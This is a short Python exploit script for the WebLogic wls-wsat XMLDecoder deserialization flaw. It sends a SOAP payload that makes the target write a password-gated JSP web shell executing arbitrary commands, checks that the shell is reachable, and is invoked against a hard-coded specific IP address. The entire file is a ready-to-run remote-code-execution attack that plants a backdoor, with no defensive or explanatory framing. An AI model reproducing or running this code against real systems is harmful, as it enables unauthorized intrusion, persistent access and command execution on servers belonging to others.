# coding:utf-8
# !/bin/env python3
import requests
import re
import sys

check_addr = '/wls-wsat/CoordinatorPortType11'

heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8',
    'SOAPAction': "",
    'Content-Type': 'text/xml;charset=UTF-8'
}

post_str = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter">
    <string>servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/321testk3ls.jsp</string>
    <void method="println"><string>
    <![CDATA[
<%
    if("023".equals(request.getParameter("pwd"))){
        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
        int a = -1;
        byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){
            out.println(new String(b,0,a));
        }
        out.print("</pre>");
    }
%>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
    </soapenv:Envelope>
    """


def check(url):
    vuln_url = url + check_addr
    print(vuln_url)
    rsp = requests.post(vuln_url, headers=heads, data=post_str, verify=False, timeout=20)
    shell = url + "/wls-wsat/321testk3ls.jsp"
    result = requests.get(url=shell, timeout=10)
    if result.status_code == 200:
        print(shell)


check('http://210.30.108.20')